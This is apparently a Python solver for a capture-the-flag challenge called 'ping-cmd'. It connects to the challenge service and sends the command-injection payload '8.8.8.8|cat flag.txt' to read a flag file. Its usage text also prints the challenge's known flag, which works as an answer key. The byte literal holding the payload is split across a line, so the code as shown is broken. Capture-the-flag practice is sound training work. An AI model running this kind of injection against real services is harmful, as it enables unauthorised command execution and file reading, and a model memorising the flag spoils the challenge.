#!/usr/bin/env python3
"""
Solver for Challenge 757: ping-cmd (General Skills)
Exploits command injection via pipe '|' operator behind ping utility.
"""
import socket
import re

def solve(host, port):
    s = socket.socket()
    s.connect((host, int(port)))
    s.settimeout(5)
    s.recv(1024)
    # Payload pipes ping output into cat flag.txt
    s.sendall(b'8.8.8.8|cat flag.txt
')

    out = ''
    while True:
        try:
            chunk = s.recv(1024).decode('utf-8', errors='ignore')
            if not chunk: break
            out += chunk
        except Exception:
            break
    s.close()
    m = re.search(r'academy{[^}]+}', out)
    return m.group(0) if m else out

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print('Usage: python3 solve_757_ping_cmd.py <host> <port>')
        print('Known Flag: academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}')
    else:
        print('Flag:', solve(sys.argv[1], sys.argv[2]))
